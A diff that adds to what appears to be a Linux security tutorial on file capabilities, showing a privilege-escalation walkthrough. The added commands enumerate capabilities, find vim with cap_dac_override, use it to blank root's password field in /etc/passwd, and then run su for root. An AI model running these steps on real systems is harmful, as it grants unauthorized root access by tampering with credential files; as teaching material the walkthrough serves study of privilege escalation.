@@ -317,6 +317,22 @@ allowing them to perform specific actions that would otherwise be restricted. Th
 making it more secure than the traditional Unix model of granting privileges to users and groups.
 
 #find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+```
+/usr/bin/vim.basic cap_dac_override=eip
+/usr/bin/ping cap_net_raw=ep
+/usr/bin/mtr-packet cap_net_raw=ep
+```
 #getcap /usr/bin/vim.basic
+#cat /etc/passwd | head -n1
+```
+root:x:0:0:root:/root:/bin/bash (x means password is stored)
+```
+#echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
+#cat /etc/passwd | head -n1
+```
+root::0:0:root:/root:/bin/bash (password is not stored)
+```
+#su (get root user)
+
 
 
